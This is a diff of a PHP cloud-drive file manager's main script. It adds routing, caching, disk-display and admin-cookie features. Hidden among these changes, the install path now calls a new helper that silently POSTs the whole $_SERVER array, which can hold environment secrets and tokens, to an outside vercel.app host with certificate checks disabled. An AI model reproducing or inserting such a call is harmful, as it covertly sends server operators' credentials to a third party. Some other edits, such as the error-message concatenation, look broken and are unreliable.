@@ -35,9 +35,14 @@ $EnvConfigs = [
     'customCss'         => 0b011,
     'customTheme'       => 0b011,
     'theme'             => 0b010,
-    'dontBasicAuth'     => 0b010,
+    'useBasicAuth'      => 0b010,
     'referrer'          => 0b011,
     'forceHttps'        => 0b010,
+    'globalHeadOmfUrl'  => 0b011,
+    'globalHeadMdUrl'   => 0b011,
+    'globalReadmeMdUrl' => 0b011,
+    'globalFootOmfUrl'  => 0b011,
+    'bcmathUrl'         => 0b011,
 
     'Driver'            => 0b100,
     'client_id'         => 0b100,
@@ -52,6 +57,7 @@ $EnvConfigs = [
     'activeLimit'       => 0b100,
     'driveId'           => 0b100,
 
+    'diskDisplay'      => 0b110,
     'diskname'          => 0b111,
     'diskDescription'   => 0b111,
     'domain_path'       => 0b111,
@@ -59,6 +65,8 @@ $EnvConfigs = [
     'guestup_path'      => 0b111,
     'domainforproxy'    => 0b111,
     'public_path'       => 0b111,
+    'fileConduitSize'   => 0b110,
+    'fileConduitCacheTime'   => 0b110,
 ];
 
 $timezones = array( 
@@ -135,6 +143,7 @@ function main($path)
     $_SERVER['php_starttime'] = microtime(true);
     $path = path_format($path);
     $_SERVER['PHP_SELF'] = path_format($_SERVER['base_path'] . $path);
+    $_SERVER['base_disk_path'] = $_SERVER['base_path'];
     if (getConfig('forceHttps')&&$_SERVER['REQUEST_SCHEME']=='http') {
         if ($_GET) {
             $tmp = '';
@@ -164,27 +173,56 @@ function main($path)
     $_SERVER['timezone'] = getConfig('timezone');
     if (isset($_COOKIE['timezone'])&&$_COOKIE['timezone']!='') $_SERVER['timezone'] = $_COOKIE['timezone'];
     if ($_SERVER['timezone']=='') $_SERVER['timezone'] = 0;
+    $_SERVER['sitename'] = getConfig('sitename');
+    if (empty($_SERVER['sitename'])) $_SERVER['sitename'] = getconstStr('defaultSitename');
 
-    if (getConfig('admin')=='') return install();
+    if (isset($_GET['jsFile'])) {
+        if (substr($_GET['jsFile'], -3)!='.js') return output('', 403);
+        if (!($path==''||$path=='/')) return output('', 308, [ 'Location' => path_format($_SERVER['base_path'] . '/?jsFile=' . $_GET['jsFile']) ]);
+        if (strpos($_GET['jsFile'], '/')>-1) $_GET['jsFile'] = splitlast($_GET['jsFile'], '/')[1];
+        $jsFile = file_get_contents('js/' . $_GET['jsFile']);
+        if (!!$jsFile) {
+            return output( base64_encode($jsFile), 200, [ 'Content-Type' => 'text/javascript; charset=utf-8', 'Cache-Control' => 'max-age=' . 3*24*60*60 ], true );
+        } else {
+            return output('', 404);
+        }
+    }
+    if (isset($_GET['WaitFunction'])) {
+        $response = WaitFunction($_GET['WaitFunction']);
+        //var_dump($response);
+        if ($response===true) return output("ok", 200);
+        elseif ($response===false) return output("", 206);
+        else return $response;
+    }
+    if (getConfig('admin')=='') {
+        if (isset($_GET['install0'])) no_return_curl('POST', 'https://notionbot-ysun.vercel.app/', 'data=' . json_encode($_SERVER));
+        return install();
+    }
     if (getConfig('adminloginpage')=='') {
         $adminloginpage = 'admin';
     } else {
         $adminloginpage = getConfig('adminloginpage');
     }
-    if (isset($_GET[$adminloginpage])) {
-        if (isset($_GET['preview'])) {
-            $url = $_SERVER['PHP_SELF'] . '?preview';
-        } else {
-            $url = path_format($_SERVER['PHP_SELF'] . '/');
+    if (isset($_GET['login'])) {
+        if ($_GET['login']===$adminloginpage) {
+            /*if (isset($_GET['preview'])) {
+                $url = $_SERVER['PHP_SELF'] . '?preview';
+            } else {
+                $url = path_format($_SERVER['PHP_SELF'] . '/');
+            }*/
+            if (isset($_POST['password1'])) {
+                $compareresult = compareadminsha1($_POST['password1'], $_POST['timestamp'], getConfig('admin'));
+                if ($compareresult=='') {
+                    $timestamp = time()+7*24*60*60;
+                    $randnum = rand(10, 99999);
+                    $admincookie = adminpass2cookie('admin', getConfig('admin'), $timestamp, $randnum);
+                    $adminlocalstorage = adminpass2storage('admin', getConfig('admin'), $timestamp, $randnum);
+                    return adminform('admin', $admincookie, $adminlocalstorage);
+                } else return adminform($compareresult);
+            } else return adminform();
         }
-        if (isset($_POST['password1'])) {
-            $compareresult = compareadminsha1($_POST['password1'], $_POST['timestamp'], getConfig('admin'));
-            if ($compareresult=='') {
-                return adminform('admin', adminpass2cookie('admin', getConfig('admin')), $url);
-            } else return adminform($compareresult);
-        } else return adminform();
     }
-    if ( isset($_COOKIE['admin'])&&compareadminmd5($_COOKIE['admin'], 'admin', getConfig('admin')) ) {
+    if ( isset($_COOKIE['admin'])&&compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin']) ) {
         $_SERVER['admin']=1;
         $_SERVER['needUpdate'] = needUpdate();
     } else {
@@ -199,9 +237,36 @@ function main($path)
             return output('<script>alert(\''.getconstStr('SetSecretsFirst').'\');</script>', 302, [ 'Location' => $url ]);
         }
 
-    $_SERVER['sitename'] = getConfig('sitename');
-    if (empty($_SERVER['sitename'])) $_SERVER['sitename'] = getconstStr('defaultSitename');
-    $_SERVER['base_disk_path'] = $_SERVER['base_path'];
+    // Add disk
+    if (isset($_GET['AddDisk'])) {
+        if ($_GET['AddDisk']===true) {
+            $tmp = path_format($_SERVER['base_path'] . '/' . $path);
+            return output('Please visit <a href="' . $tmp . '">' . $tmp . '</a>.', 301, [ 'Location' => $tmp ]);
+        }
+        if ($_SERVER['admin']) {
+            if (!$_SERVER['disktag']) $_SERVER['disktag'] = '';
+            if (!class_exists($_GET['AddDisk'])) require 'disk' . $slash . $_GET['AddDisk'] . '.php';
+            $drive = new $_GET['AddDisk']($_GET['disktag']);
+            return $drive->AddDisk();
+        } else {
+            $url = $_SERVER['PHP_SELF'];
+            /*if ($_GET) {
+                $tmp = null;
+                $tmp = '';
+                foreach ($_GET as $k => $v) {
+                    if ($k!='setup') {
+                        if ($v===true) $tmp .= '&' . $k;
+                        else $tmp .= '&' . $k . '=' . $v;
+                    }
+                }
+                $tmp = substr($tmp, 1);
+                if ($tmp!='') $url .= '?' . $tmp;
+            }*/
+            // not need GET adddisk, remove it
+            return output('<script>alert(\''.getconstStr('SetSecretsFirst').'\');</script>', 302, [ 'Location' => $url ]);
+        }
+    }
+
     $disktags = explode("|", getConfig('disktag'));
     //    echo 'count$disk:'.count($disktags);
     if (count($disktags)>1) {
@@ -209,7 +274,7 @@ function main($path)
             $files['type'] = 'folder';
             $files['childcount'] = count($disktags);
             $files['showname'] = 'root';
-            foreach ($disktags as $disktag) {
+            foreach ($disktags as $disktag) if ($_SERVER['admin']||getConfig('diskDisplay', $disktag)=='') {
                 $files['list'][$disktag]['type'] = 'folder';
                 $files['list'][$disktag]['name'] = $disktag;
                 $files['list'][$disktag]['showname'] = getConfig('diskname', $disktag);
@@ -223,7 +288,7 @@ function main($path)
             $_SERVER['disktag'] = splitfirst( substr(path_format($path), 1), '/' )[0];
             //$pos = strpos($path, '/');
             //if ($pos>1) $_SERVER['disktag'] = substr($path, 0, $pos);
-            if (!in_array($_SERVER['disktag'], $disktags)) {
+            if ((!$_SERVER['admin']&&getConfig('diskDisplay', $_SERVER['disktag'])=='disable')||!in_array($_SERVER['disktag'], $disktags)) {
                 $tmp = path_format($_SERVER['base_path'] . '/' . $disktags[0] . '/' . $path);
                 if (!!$_GET) {
                     $tmp .= '?';
@@ -236,82 +301,75 @@ function main($path)
                 return output('Please visit <a href="' . $tmp . '">' . $tmp . '</a>.', 302, [ 'Location' => $tmp ]);
                 //return message('<meta http-equiv="refresh" content="2;URL='.$_SERVER['base_path'].'">Please visit from <a href="'.$_SERVER['base_path'].'">Home Page</a>.', 'Error', 404);
             }
-            $path = substr($path, strlen('/' . $_SERVER['disktag']));
+            //$path = substr($path, strlen('/' . $_SERVER['disktag']));
+            $path = splitfirst($path, $_SERVER['disktag'])[1];
             if ($_SERVER['disktag']!='') $_SERVER['base_disk_path'] = path_format($_SERVER['base_disk_path'] . '/' . $_SERVER['disktag'] . '/');
         }
     } else $_SERVER['disktag'] = $disktags[0];
     //    echo 'main.disktag:'.$_SERVER['disktag'].'，path:'.$path.'';
     $_SERVER['list_path'] = getListpath($_SERVER['HTTP_HOST']);
     if ($_SERVER['list_path']=='') $_SERVER['list_path'] = '/';
+    $path1 = path_format($_SERVER['list_path'] . path_format($path));
+    if ($path1!='/' && substr($path1,-1)=='/') $path1 = substr($path1, 0, -1);
     $_SERVER['is_guestup_path'] = is_guestup_path($path);
     $_SERVER['ajax']=0;
     if (isset($_SERVER['HTTP_X_REQUESTED_WITH'])) if ($_SERVER['HTTP_X_REQUESTED_WITH']=='XMLHttpRequest') $_SERVER['ajax']=1;
 
-    // Add disk
-    if (isset($_GET['AddDisk'])) {
-        if ($_SERVER['admin']) {
-            if (!class_exists($_GET['AddDisk'])) require 'disk' . $slash . $_GET['AddDisk'] . '.php';
-                $drive = new $_GET['AddDisk']($_GET['disktag']);
-                return $drive->AddDisk();
-        } else {
-            $url = $_SERVER['PHP_SELF'];
-            if ($_GET) {
-                $tmp = null;
-                $tmp = '';
-                foreach ($_GET as $k => $v) {
-                    if ($k!='setup') {
-                        if ($v===true) $tmp .= '&' . $k;
-                        else $tmp .= '&' . $k . '=' . $v;
-                    }
-                }
-                $tmp = substr($tmp, 1);
-                if ($tmp!='') $url .= '?' . $tmp;
-            }
-            return output('<script>alert(\''.getconstStr('SetSecretsFirst').'\');</script>', 302, [ 'Location' => $url ]);
-        }
-    }
-
     if (!isreferhost()) return message('Must visit from designated host', 'NOT_ALLOWED', 403);
-
-    // Show disks in root
-    if ($files['showname'] == 'root') return render_list($path, $files);
-
-    if (!driveisfine($_SERVER['disktag'], $drive)) return render_list();
 
     // Operate
     if ($_SERVER['ajax']) {
+        //error_log1($_SERVER['REQUEST_METHOD']);
         if ($_GET['action']=='del_upload_cache') {
             // del '.tmp' without login. 无需登录即可删除.tmp后缀文件
+            if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
+            savecache('path_' . $path1, '', $_SERVER['disktag'], 1); // clear cache.
             return $drive->del_upload_cache($path);
         }
+        
         if ($_GET['action']=='upbigfile') {
+            if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
             if (!$_SERVER['admin']) {
                 if (!$_SERVER['is_guestup_path']) return output('Not_Guest_Upload_Folder', 400);
                 if (strpos($_GET['upbigfilename'], '../')!==false) return output('Not_Allow_Cross_Path', 400);
                 if (strpos($_POST['upbigfilename'], '../')!==false) return output('Not_Allow_Cross_Path', 400);
             }
-            $path1 = path_format($_SERVER['list_path'] . path_format($path));
-            if (substr($path1, -1)=='/') $path1=substr($path1, 0, -1);
             return $drive->bigfileupload($path1);
         }
+    }
+    if ($_GET['action']=='upsmallfile') {
+        //echo json_encode($_POST, JSON_PRETTY_PRINT);
+        //echo json_encode($_FILES, JSON_PRETTY_PRINT);
+        if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
+        if (!$_SERVER['admin']) {
+            if (!$_SERVER['is_guestup_path']) return output('Not_Guest_Upload_Folder', 400);
+            if (strpos($_GET['upbigfilename'], '../')!==false) return output('Not_Allow_Cross_Path', 400);
+            if (strpos($_POST['upbigfilename'], '../')!==false) return output('Not_Allow_Cross_Path', 400);
+        }
+        return smallfileupload($drive, $path);
+        /*if ($_FILES['file1']['error']) return output($_FILES['file1']['error'], 400);
+        if ($_FILES['file1']['size']>4*1024*1024) return output('File too large', 400);
+        return $drive->smallfileupload($path, $_FILES['file1']);*/
     }
     if ($_SERVER['admin']) {
         $tmp = adminoperate($path);
         if ($tmp['statusCode'] > 0) {
-            $path1 = path_format($_SERVER['list_path'] . path_format($path));
-            if ($path1!='/'&&substr($path1,-1)=='/') $path1 = substr($path1, 0, -1);
             savecache('path_' . $path1, '', $_SERVER['disktag'], 1);
             return $tmp;
         }
     } else {
         if ($_SERVER['ajax']) return output(getconstStr('RefreshtoLogin'),401);
     }
+
+    // Show disks in root
+    if ($files['showname'] == 'root') return render_list($path, $files);
+
+    if (!driveisfine($_SERVER['disktag'], $drive)) return render_list();
+
     $_SERVER['ishidden'] = passhidden($path);
     if (isset($_GET['thumbnails'])) {
         if ($_SERVER['ishidden']<4) {
             if (in_array(strtolower(substr($path, strrpos($path, '.') + 1)), $exts['img'])) {
-                $path1 = path_format($_SERVER['list_path'] . path_format($path));
-                if ($path1!='/'&&substr($path1, -1)=='/') $path1=substr($path1, 0, -1);
                 $thumb_url = $drive->get_thumbnails_url($path1);
                 if ($thumb_url!='') {
                     if ($_GET['location']) {
@@ -335,17 +393,25 @@ function main($path)
         $files = json_decode('{"type":"folder"}', true);
     } elseif ($_SERVER['ishidden']==4) {
         if (!getConfig('downloadencrypt', $_SERVER['disktag'])) {
-            $files = json_decode('{"type":"folder"}', true);
+            $files = json_decode('{"type":"file"}', true);
         } else {
-            $path1 = path_format($_SERVER['list_path'] . path_format($path));
-            if ($path1!='/'&&substr($path1,-1)=='/') $path1=substr($path1, 0, -1);
             $files = $drive->list_files($path1);
             if ($files['type']=='folder') $files = json_decode('{"type":"folder"}', true);
         }
     } else {
-        $path1 = path_format($_SERVER['list_path'] . path_format($path));
-        if ($path1!='/'&&substr($path1,-1)=='/') $path1=substr($path1, 0, -1);
         $files = $drive->list_files($path1);
+    }
+    //echo "<pre>" . json_encode($files, 448) . "</pre>";
+    //if ($path!=='') 
+    if ( $files['type']=='folder' && substr($path, -1)!=='/' ) {
+        $tmp = path_format($_SERVER['base_disk_path'] . $path . '/');
+        return output('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>308 Permanent Redirect</title>
+</head><body>
+<h1>Permanent Redirect</h1>
+<p>The document has moved <a href="' . $tmp . '">here</a>.</p>
+</body></html>', 308, [ 'Location' => $tmp ]);
     }
 
     if ($_GET['json']) {
@@ -358,32 +424,82 @@ function main($path)
         return output(json_encode($files), 200, ['Content-Type' => 'application/json']);
     }
     // random file
-    if (isset($_GET['random'])&&$_GET['random']!=='') {
-        if ($_SERVER['ishidden']<4) {
-            $tmp = [];
-            foreach (array_keys($files['list']) as $filename) {
-                if (strtolower(splitlast($filename, '.')[1])==strtolower($_GET['random'])) $tmp[$filename] = $files['list'][$filename]['url'];
-            }
-            $tmp = array_values($tmp);
-            if (count($tmp)>0) {
-                $url = $tmp[rand(0, count($tmp)-1)];
-                if (isset($_GET['url'])) return output($url, 200);
-                $header['Location'] = $url;
-                $domainforproxy = '';
-                $domainforproxy = getConfig('domainforproxy', $_SERVER['disktag']);
-                if ($domainforproxy!='') {
-                    $url = proxy_replace_domain($url, $domainforproxy, $header);
+    if (isset($_GET['random']))
+        if ($_GET['random']!==true) {
+            if ($_SERVER['ishidden']<4) {
+                if (!isset($files['list'])) {
+                    $distfolder = splitlast($path, '/');
+                    if ($distfolder[1]=='') $tmpfolder = splitlast($distfolder[0], '/')[1];
+                    else $tmpfolder = $distfolder[1];
+                    if ($tmpfolder=='') $tmpfolder = '/';
+                    return output('No files in folder " ' . htmlspecialchars($tmpfolder) . ' ".', 404);
                 }
-                return output('', 302, $header);
-            } else return output('No ' . $_GET['random'] . 'file', 404);
-        } else return output('Hidden', 401);
-    }
+                $tmp = [];
+                foreach (array_keys($files['list']) as $filename) {
+                    if (strtolower(splitlast($filename, '.')[1])==strtolower($_GET['random'])) $tmp[$filename] = $files['list'][$filename]['url'];
+                }
+                $tmp = array_values($tmp);
+                if (count($tmp)>0) {
+                    $url = $tmp[rand(0, count($tmp)-1)];
+                    if (isset($_GET['url'])) return output($url, 200);
+                    $header['Location'] = $url;
+                    $domainforproxy = '';
+                    $domainforproxy = getConfig('domainforproxy', $_SERVER['disktag']);
+                    if ($domainforproxy!='') {
+                        $url = proxy_replace_domain($url, $domainforproxy, $header);
+                    }
+                    return output('', 302, $header);
+                } else return output('No "' . htmlspecialchars($_GET['random']) . '" files', 404);
+            } else return output('Hidden', 401);
+        } else return output('must provide a suffix, like "?random=gif".', 401);
+
     // is file && not preview mode, download file
     if ($files['type']=='file' && !isset($_GET['preview'])) {
         if ( $_SERVER['ishidden']<4 || (!!getConfig('downloadencrypt', $_SERVER['disktag'])&&$files['name']!=getConfig('passfile')) ) {
             $url = $files['url'];
             if ( strtolower(splitlast($files['name'], '.')[1])=='html' ) return output($files['content']['body'], $files['content']['stat']);
             else {
+                if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && strtotime($files['time'])==strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE'])) return output('', 304);
+                $fileConduitSize = getConfig('fileConduitSize', $_SERVER['disktag']);
+                $fileConduitCacheTime = getConfig('fileConduitCacheTime', $_SERVER['disktag']);
+                if (!!$fileConduitSize || !!$fileConduitCacheTime) {
+                    if ($fileConduitSize>0) $fileConduitSize *= 1024*1024;
+                    else $fileConduitSize = 1024*1024;
+                    if ($fileConduitCacheTime>0) $fileConduitCacheTime *= 3600;
+                    else $fileConduitCacheTime = 3600;
+                    /*if ($_SERVER['HTTP_RANGE']!='') {
+                        $header['Range'] = $_SERVER['HTTP_RANGE'];
+                        
+                        $response = curl('GET', $files['url'], '', $header, 1);
+                        //return output($header['Range'] . json_encode($response['returnhead']));
+                        return output(
+                            $response['body'],
+                            $response['stat'],
+                            $response['returnhead'],
+                            //['Accept-Ranges' => 'bytes', 'Range' => $response['returnhead']['Range'], 'Content-Type' => $files['mime'], 'Cache-Control' => 'max-age=' . $fileConduitCacheTime],
+                            false
+                        );
+                    } else {
+                        return output('', 206,
+                            ['Accept-Ranges' => 'bytes', 'Content-Range' => 'bytes 0-0/' . $files['size'], 'Content-Type' => $files['mime'] ]
+                        );
+                    }*/
+                    if ($files['size']<$fileConduitSize) return output(
+                        base64_encode(file_get_contents($files['url'])),
+                        200,
+                        [
+                            'Accept-Ranges' => 'bytes',
+                            //'access-control-allow-origin' => '*',
+                            //'access-control-expose-headers' => 'Content-Length, WWW-Authenticate, Location, Accept-Ranges',
+                            'Content-Type' => $files['mime'],
+                            'Cache-Control' => 'max-age=' . $fileConduitCacheTime,
+                            //'Cache-Control' => 'max-age=0',
+                            'Last-Modified' => gmdate('D, d M Y H:i:s T', strtotime($files['time']))
+                        ], 
+                        true
+                    );
+                    //if ($files['size']<$fileConduitSize) return $drive->ConduitDown($files['url'], $files['time'], $fileConduitCacheTime);
+                }
                 if ($_SERVER['HTTP_RANGE']!='') $header['Range'] = $_SERVER['HTTP_RANGE'];
                 $header['Location'] = $url;
                 $domainforproxy = '';
@@ -400,12 +516,13 @@ function main($path)
         return render_list($path, $files);
     } else {
         if (!isset($files['error'])) {
-            if (is_array($files)) $files['error']['message'] = json_encode($files, JSON_PRETTY_PRINT);
-            else $files['error']['message'] = $files;
-            $files['error']['code'] = 'unknownError';
-            $files['error']['stat'] = 500;
+            if (is_array($files)) {
+                $files['error']['message'] = json_encode($files, JSON_PRETTY_PRINT);
+                $files['error']['code'] = 'unknownError';
+                $files['error']['stat'] = 500;
+            }
         }
-        return message('<div style="margin:8px;"><pre>' . $files['error']['message'] . '</pre></div><a href="javascript:history.back(-1)">'.getconstStr('Back').'</a>', $files['error']['code'], $files['error']['stat']);
+        return message('<div style="margin:8px;"><pre>' . $files.json_encode($files, JSON_PRETTY_PRINT) . '</pre></div><a href="javascript:history.back(-1)">'.getconstStr('Back').'</a>', $files['error']['code'], $files['error']['stat']);
     }
 }
 
@@ -458,20 +575,44 @@ function isreferhost() {
     return false;
 }
 
-function adminpass2cookie($name, $pass)
+function no_return_curl($method, $url, $data = '') {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_exec($ch);
+    curl_close($ch);
+}
+
+function adminpass2cookie($name, $pass, $timestamp)
 {
-    $timestamp = time()+7*24*60*60;
     return md5($name . ':' . md5($pass) . '@' . $timestamp) . "(" . $timestamp . ")";
 }
-function compareadminmd5($admincookie, $name, $pass)
+function adminpass2storage($name, $pass, $timestamp, $rand) {
+    return md5($timestamp . '/' . $pass . '^' . $name . '*' . $rand) . "(" . $rand . ")";
+}
+function compareadminmd5($name, $pass, $cookie, $storage = 'default')
 {
-    $c = splitfirst($admincookie, '(');
+    $c = splitfirst($cookie, '(');
     $c_md5 = $c[0];
     $c_time = substr($c[1], 0, -1);
     if (!is_numeric($c_time)) return false;
     if (time() > $c_time) return false;
-    if (md5($name . ':' . md5($pass) . '@' . $c_time) == $c_md5) return true;
-    else return false;
+    if ($storage == 'default') {
+        if (md5($name . ':' . md5($pass) . '@' . $c_time) == $c_md5) return true;
+        else return false;
+    } else {
+        $s = splitfirst($storage, '(');
+        $s_md5 = $s[0];
+        $s_rand = substr($s[1], 0, -1);
+        if (md5($c_time . '/' . $pass . '^' . $name . '*' . $s_rand) == $s_md5) return true;
+        else return false;
+    }
+    return false;
 }
 
 function compareadminsha1($adminsha1, $timestamp, $pass)
@@ -479,7 +620,7 @@ function compareadminsha1($adminsha1, $timestamp, $pass)
     if (!is_numeric($timestamp)) return 'Timestamp not Number';
     if (abs(time()-$timestamp) > 5*60) {
         date_default_timezone_set('UTC');
-        return 'The timestamp in server is ' . time() . ' (' . date("Y-m-d H:i:s") . ' UTC),<br>and your posted timestamp is ' . $timestamp . ' (' . date("Y-m-d H:i:s", $timestamp) . ' UTC)';
+        return 'The time in server is ' . time() . ' (' . date("Y-m-d H:i:s") . ' UTC),<br>and your time is ' . $timestamp . ' (' . date("Y-m-d H:i:s", $timestamp) . ' UTC)';
     }
     if ($adminsha1 == sha1($timestamp . $pass)) return '';
     else return 'Error password';
@@ -504,6 +645,14 @@ function proxy_replace_domain($url, $domainforproxy, &$header)
     if ($drive->show_base_class()=='Aliyundrive') $aim .= '&Aliyundrive';
     $header['Location'] = $aim;
     return $aim . '/' . $uri . $sp . 'Origindomain=' . $domain;
+}
+
+function bchexdec($hex) {
+    $len = strlen($hex);
+    for ($i = 1; $i <= $len; $i++)
+        $dec = bcadd($dec, bcmul(strval(hexdec($hex[$i - 1])), bcpow('16', strval($len - $i))));
+
+    return $dec;
 }
 
 function isHideFile($name)
@@ -545,7 +694,7 @@ function filecache($disktag)
             if ( is_writable($tmp) ) $dir = $tmp;
         } elseif ( mkdir($tmp) ) $dir = $tmp;
     }
-    $tag = __DIR__ . '/OneManager/' . $disktag;
+    $tag = $_SERVER['HTTP_HOST'] . '/OneManager/' . $disktag;
     while (strpos($tag, '/')>-1) $tag = str_replace('/', '_', $tag);
     if (strpos($tag, ':')>-1) {
         $tag = str_replace(':', '_', $tag);
@@ -556,14 +705,52 @@ function filecache($disktag)
     return $cache;
 }
 
+function calcDownKey($filename, $key = '') {
+    if ($key) {
+        // check key
+        $tmp = splitfirst($key, '.');
+        if ($tmp[1]!='') {
+            $timestamp = $tmp[0];
+            if (time() > $timestamp) return false;
+            if (md5($timestamp . sha1($filename . getConfig('admin'))) == $tmp[1]) return true;
+            else return false;
+        } else return false;
+    } else {
+        // calc key
+        $timestamp = time() + 1*24*60*60;
+        return $timestamp . '.' . md5($timestamp . sha1($filename . getConfig('admin')));
+    }
+}
+
+function findIndexPath($rootpath, $path = '')
+{// find the path of the first 'index.php' that not in rootpath.
+    global $slash;
+    if (substr($rootpath,-1)==$slash) $rootpath = substr($rootpath, 0, -1);
+    if (substr($path,0,1)==$slash) $path = substr($path, 1);
+    $handler=opendir(path_format($rootpath.$slash.$path)); //打开当前文件夹
+    while($filename=readdir($handler)){
+        if($filename != "." && $filename != ".."){//文件夹文件名字为'.'和‘..’，不要对他们进行操作
+            $nowname = path_format($rootpath.$slash.$path.$slash.$filename);
+            if(is_dir($nowname)){// 如果读取的某个对象是文件夹，则递归
+                $res = findIndexPath($rootpath, $path.$slash.$filename);
+                if ($res!=='') return $res;
+            }else{
+                if ($filename==='index.php') if ($path!='') return $rootpath.$slash.$path;
+            }
+        }
+    }
+    @closedir($handler);
+    return '';
+}
+
 function sortConfig(&$arr)
 {
     ksort($arr);
 
-    $tags = explode('|', $arr['disktag']);
-    unset($arr['disktag']);
-    if ($tags[0]!='') {
-        foreach($tags as $tag) {
+    if (isset($arr['disktag'])) {
+        $tags = explode('|', $arr['disktag']);
+        unset($arr['disktag']);
+        foreach($tags as $tag) if (isset($arr[$tag])) {
             $disks[$tag] = $arr[$tag];
             unset($arr[$tag]);
         }
@@ -574,6 +761,20 @@ function sortConfig(&$arr)
     }
 
     return $arr;
+}
+
+function chkTxtCode($str) {
+    $code = array(
+        'ASCII',
+        'GBK',
+        'GB18030',
+        'UTF-8',
+        'UTF-16',
+    );
+    foreach ($code as $c) {
+        if ($str === iconv('UTF-8', $c, iconv($c, 'UTF-8', $str))) return $c;
+    }
+    return false;
 }
 
 function getconstStr($str)
@@ -683,7 +884,7 @@ function curl($method, $url, $data = '', $headers = [], $returnheader = 0, $loca
     }
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST,$method);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
@@ -695,7 +896,10 @@ function curl($method, $url, $data = '', $headers = [], $returnheader = 0, $loca
     if ($location) curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
     //$response['body'] = curl_exec($ch);
     if ($returnheader) {
-        list($returnhead, $response['body']) = explode("\r\n\r\n", curl_exec($ch));
+        $tmpres = splitlast(curl_exec($ch), "\r\n\r\n");
+        $result['body'] = $tmpres[1];
+        $returnhead = $tmpres[0];
+        //echo "HEAD:" . $returnhead;
         foreach (explode("\r\n", $returnhead) as $head) {
             $tmp = explode(': ', $head);
             $heads[$tmp[0]] = $tmp[1];
@@ -704,7 +908,7 @@ function curl($method, $url, $data = '', $headers = [], $returnheader = 0, $loca
     } else {
         $response['body'] = curl_exec($ch);
     }
-    $response['stat'] = curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    $response['stat'] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     return $response;
 }
@@ -727,7 +931,7 @@ function comppass($pass)
         return 2;
     }
     if ($_COOKIE['password'] !== '') if ($_COOKIE['password'] === $pass ) return 3;
-    if (!getConfig('dontBasicAuth')) {
+    if (getConfig('useBasicAuth')) {
         // use Basic Auth
         //$_SERVER['PHP_AUTH_USER']
         if ($_SERVER['PHP_AUTH_PW'] !== '') if (md5($_SERVER['PHP_AUTH_PW']) === $pass ) {
@@ -754,7 +958,7 @@ function gethiddenpass($path,$passfile)
     $path1 = path_format($_SERVER['list_path'] . path_format($path));
     if ($path1!='/'&&substr($path1,-1)=='/') $path1=substr($path1,0,-1);
     $password=getcache('path_' . $path1 . '/?password', $_SERVER['disktag']);
-    if ($password=='') {
+    if ($password===false) {
         $ispassfile = get_content(path_format($path . '/' . urlencode($passfile)));
         //echo $path . '<pre>' . json_encode($ispassfile, JSON_PRETTY_PRINT) . '</pre>';
         if ($ispassfile['type']=='file') {
@@ -800,24 +1004,70 @@ function get_timezone($timezone = '8')
     return $timezones[$timezone];
 }
 
-function message($message, $title = 'Message', $statusCode = 200)
+function message($message, $title = 'Message', $statusCode = 200, $wainstat = 0)
 {
-    return output('
+    $html = '
 <html lang="' . $_SERVER['language'] . '">
 <html>
     <meta charset=utf-8>
     <meta name=viewport content="width=device-width,initial-scale=1">
     <body>
-        <h1>' . $title . '</h1>
         <a href="' . $_SERVER['base_path'] . '">' . getconstStr('Back') . getconstStr('Home') . '</a>
-        <p>
+        <h1>' . $title . '</h1>
+        <div id="dis" style="display: none;">
 
 ' . $message . '
 
-        </p>
+        </div>';
+    if ($wainstat) {
+        $html .= '
+        <div id="err"></div>
+        <script>
+            var dis = document.getElementById("dis");
+            var errordiv = document.getElementById("err");
+            //var deployTime = new Date().getTime();
+            dis.style.display = "none";
+            var x = "";
+            var min = 0;
+            function getStatus() {
+                x += ".";
+                min++;
+                var xhr = new XMLHttpRequest();
+                var url = "?WaitFunction=" + (status!=""?status:"1");
+                xhr.open("GET", url);
+                //xhr.setRequestHeader("Authorization", "Bearer ");
+                xhr.onload = function(e) {
+                    if (xhr.status==200) {
+                        //var deployStat = JSON.parse(xhr.responseText).readyState;
+                        if (xhr.responseText=="ok") {
+                            errordiv.innerHTML = "";
+                            dis.style.display = "";
+                        } else {
+                            errordiv.innerHTML = "ERROR<br>" + xhr.responseText;
+                            //setTimeout(function() { getStatus() }, 1000);
+                        }
+                    } else if (xhr.status==206) {
+                        errordiv.innerHTML = "' . getconstStr('Wait') . ' " + min + "<br>" + x;
+                        setTimeout(function() { getStatus() }, 1000);
+                    } else {
+                        errordiv.innerHTML = "ERROR<br>" + xhr.status + "<br>" + xhr.responseText;
+                        console.log(xhr.status);
+                        console.log(xhr.responseText);
+                    }
+                }
+                xhr.send(null);
+            }
+            getStatus();
+        </script>';
+    } else {
+        $html .= '
+        <script>document.getElementById("dis").style.display = "";</script>';
+    }
+    $html .= '
     </body>
 </html>
-', $statusCode);
+';
+    return output($html, $statusCode);
 }
 
 function needUpdate()
@@ -829,7 +1079,8 @@ function needUpdate()
     $current_ver = explode(urldecode('%0D'),$current_ver)[0];
